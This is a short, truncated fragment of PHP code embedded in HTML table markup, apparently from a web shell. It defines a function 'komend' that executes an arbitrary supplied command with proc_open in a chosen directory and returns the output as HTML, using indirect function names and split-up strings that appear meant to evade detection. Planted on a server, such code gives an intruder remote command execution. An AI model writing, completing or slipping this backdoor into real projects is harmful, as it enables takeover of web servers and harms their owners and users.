...
<tr><td>';
		...
		function komend($kom, $lk)
		{
			...
			if ($a($b)) {
				$descriptors = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r"));
				$process = proc_open($kom, $descriptors, $pipes, $lk);
				if (is_resource($process)) {
					$output = stream_get_contents($pipes[1]);
					fclose($pipes[1]);
					$status = proc_get_status($process);
					proc_close($process);
					return "<pre>" . $c($output) . "</pre>";
				} else {
					return "Er" . "ro" . "r " . "ex" . "ec" . "ut" . "in" . "g c" . "om" . "ma" . "nd.";
				}
			} else {
